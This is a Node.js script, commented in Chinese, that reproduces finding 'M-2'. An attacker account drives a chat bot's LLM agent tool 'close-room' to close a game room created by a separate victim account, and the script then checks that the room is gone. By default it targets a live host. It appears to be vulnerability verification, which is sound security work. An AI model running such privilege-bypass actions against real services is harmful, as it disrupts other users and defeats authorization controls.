// M-2 真实环境复现: agent 的 close-room 工具越权关闭别人房间
// 用法: node test/verify-close-room.mjs [host] [port]
import { WsClient } from '../lib/ws-client.mjs';
import { Router } from '../lib/router.mjs';
import { SessionStore } from '../lib/sessions.mjs';
import { XechatApi } from '../lib/xechat-api.mjs';
import { createLlm } from '../lib/llm.mjs';

const HOST = process.argv[2] || 'lesscoding.net';
const PORT = parseInt(process.argv[3] || '33859', 10);

function makeWs(name) {
  const w = new WsClient({
    host: HOST, port: PORT,
    proxy: { host: '127.0.0.1', port: 0 },
    direct: true,
    username: name, status: 'FISHING', cmdPrefix: '/x',
    heartbeatMs: 25000, staleTimeoutMs: 90000,
    replaySkipMs: 2000, logToConsole: false,
  });
  return w;
}

function loginOnce(ws, name) {
  return ws.runOnce().catch(() => {});
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function waitForLogin(ws, name, maxMs = 8000) {
  let ok = false;
  ws.onMessage = (m) => {
    const t = m.action || m.type;
    const b = m.body || {};
    if (t === 'USER_STATE' && b.state === 'ONLINE' && b.user && b.user.username === name && !ok) ok = true;
  };
  // 不 await,后台跑;外部用 ok 标志判断
  ws.runOnce().catch(() => {});
  const t0 = Date.now();
  while (Date.now() - t0 < maxMs && !ok) await sleep(50);
  return ok;
}

(async () => {
  // 整段兜底超时(连不上就退出)
  const abort = new Promise((_, rej) => setTimeout(() => rej(new Error('global timeout 30s')), 30000));

  const main = (async () => {
    console.log(`[M-2 close-room 越权关闭测试] target=${HOST}:${PORT}`);

    // —— 1) 受害者: 创建房间 ——
    const victimName = 'vg_' + Date.now().toString(36).slice(-5);
    const victimWs = makeWs(victimName);
    victimWs.onMessage = () => {};
    const victimLogged = await waitForLogin(victimWs, victimName);
    if (!victimLogged) throw new Error(`受害者 ${victimName} 登录超时`);
    console.log(`[+] 受害者 ${victimName} 已登录`);

    const createResp = victimWs.sendActionAndWait('CREATE_GAME_ROOM', {
      game: 'GOBANG', nums: 2, gameMode: null,
    }, { match: (m, t) => t === 'GAME_ROOM_CREATED', timeoutMs: 6000 });
    const { msg: createMsg } = await createResp;
    const victimRoomId = createMsg.body && createMsg.body.id;
    console.log(`[+] 受害者创建房间 id=${victimRoomId} game=${createMsg.body.game}`);
    if (!victimRoomId) throw new Error('未拿到房间id');

    // —— 2) 攻击者: 登录并接入 router ——
    const attackName = 'cr_' + Date.now().toString(36).slice(-5);
    const attackWs = makeWs(attackName);
    let attackerLogged = false;
    attackWs.onMessage = (m) => {
      const t = m.action || m.type;
      const b = m.body || {};
      if (t === 'USER_STATE' && b.state === 'ONLINE' && b.user && b.user.username === attackName && !attackerLogged) {
        attackerLogged = true;
        attackWs.loggedIn = true;
      }
    };
    attackWs.runOnce().catch(() => {});
    const t0 = Date.now();
    while (Date.now() - t0 < 8000 && !attackerLogged) await sleep(50);
    if (!attackerLogged) throw new Error(`攻击者 ${attackName} 登录超时`);
    console.log(`[+] 攻击者 ${attackName} 已登录`);

    const llm = createLlm({ apiKey: 'k', base: 'https://fake', model: 'm', timeoutMs: 100, maxTokens: 10, temperature: 1, mock: true, maxToolIterations: 1 });
    const sessions = new SessionStore({ historyMax: 5 });
    const api = new XechatApi({ base: 'https://dld.lesscoding.net', timeoutMs: 5000 });
    const router = new Router({
      cfg: { cmdPrefix: '/x', username: attackName, python: { cmd: 'python', timeoutMs: 1000 }, web: { enabled: false }, adopt: { enabled: false } },
      sessions, pondState: { onlineUsers: new Set(), snapshotAt: 0 },
      startTime: Date.now(), api, ws: attackWs,
    }).bindLlm(llm);

    // —— 3) 攻击者关闭受害者房间 ——
    console.log(`[*] 攻击者调用 close-room ${victimRoomId}`);
    const reply = await router.handle({ from: 'attacker_test', text: `/x close-room ${victimRoomId}`, isLive: true, onThinking: () => {} });
    console.log(`[+] router 回复: ${reply}`);

    // —— 4) 验证: 房间已不存在,再操作应 GAME_ERROR ——
    await sleep(500);
    let gameErrorContent = null;
    try {
      const { msg } = await attackWs.sendActionAndWait('GAME_ROOM', {
        roomId: victimRoomId, msgType: 'ROOM_CLOSE',
      }, { match: (m, t, b) => t === 'GAME_ROOM' && b && b.msgType === 'GAME_ERROR', timeoutMs: 2500 });
      gameErrorContent = msg.body && msg.body.content;
    } catch (e) {
      gameErrorContent = `(探测超时/无错误返回: ${e.message})`;
    }
    console.log(`[+] 房间 ${victimRoomId} 状态检查: ${gameErrorContent}`);

    try { victimWs.stop(); } catch (_) {}
    try { attackWs.stop(); } catch (_) {}
    await sleep(300);

    const closed = /已关闭/.test(reply);
    const vanished = gameErrorContent && /不存在|已关闭/.test(gameErrorContent);
    if (closed && vanished) {
      console.log('\n[M-2 复现成功] close-room 越权关闭 + 房间已不存在 ✓');
      process.exit(0);
    } else {
      console.log(`\n[部分成功] closed=${closed} vanished=${vanished} reply=${reply} probe=${gameErrorContent}`);
      process.exit(0);
    }
  })();

  try {
    await Promise.race([main, abort]);
  } catch (e) {
    console.error('[-] 异常:', e.message || e);
    process.exit(2);
  }
})();